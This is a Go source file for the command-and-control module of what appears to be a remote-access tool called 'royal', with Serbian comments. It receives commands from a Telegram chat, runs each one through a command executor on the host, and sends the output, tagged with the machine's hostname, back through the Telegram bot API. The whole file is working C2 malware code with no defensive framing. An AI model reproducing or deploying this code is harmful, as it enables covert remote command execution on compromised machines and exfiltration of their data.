package c2

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"royal/config"
	"royal/internal/commands"
)

func HandleWebhook(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println("Greška pri čitanju Webhook zahteva:", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var update struct {
		Message struct {
			Text string `json:"text"`
			Chat struct {
				ID int `json:"id"`
			} `json:"chat"`
		} `json:"message"`
	}

	if err := json.Unmarshal(body, &update); err != nil {
		log.Println("Greška pri parsiranju JSON-a:", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	cfg := config.LoadConfig()
	if fmt.Sprintf("%d", update.Message.Chat.ID) != cfg.ChatID {
		log.Println("Ignorišem poruku iz nepoznate grupe.")
		return
	}

	log.Println("Primljena komanda:", update.Message.Text)
	output := commands.ExecuteCommand(update.Message.Text)
	SendMessage(output)
}

// SendMessage šalje poruku sa identifikacijom klijenta
func SendMessage(message string) error {
	cfg := config.LoadConfig()
	hostname, _ := os.Hostname()

	/* Debug log – Provera BOT_TOKEN i CHAT_ID pre slanja
	log.Println("📡 Pokušaj slanja poruke u Telegram...")
	log.Println("🔹 BOT_TOKEN:", cfg.BotToken)
	log.Println("🔹 GROUP_CHAT_ID:", cfg.ChatID)
	*/

	// Proveri da li su promenljive postavljene
	if cfg.BotToken == "default_bot_token" || cfg.ChatID == "default_chat_id" {
		log.Println("❌ Greška: BOT_TOKEN ili GROUP_CHAT_ID nisu postavljeni!")
		return nil
	}

	// Priprema JSON podataka za slanje
	data := map[string]string{
		"chat_id": cfg.ChatID,
		"text":    "[" + hostname + "] " + message,
	}

	jsonData, _ := json.Marshal(data)

	// Debug – Šta se tačno šalje?
	//log.Println("📩 HTTP request body:", string(jsonData))

	// Kreiramo HTTP zahtev
	resp, err := http.Post(cfg.APIURL+"/sendMessage", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Println("❌ Greška pri slanju poruke:", err)
		return err
	}
	defer resp.Body.Close()

	// Debug – Prikazujemo odgovor od Telegram API-ja
	//body, _ := io.ReadAll(resp.Body)
	//log.Println("📬 Telegram API response status:", resp.Status)
	//log.Println("📬 Telegram API response body:", string(body))

	return nil
}
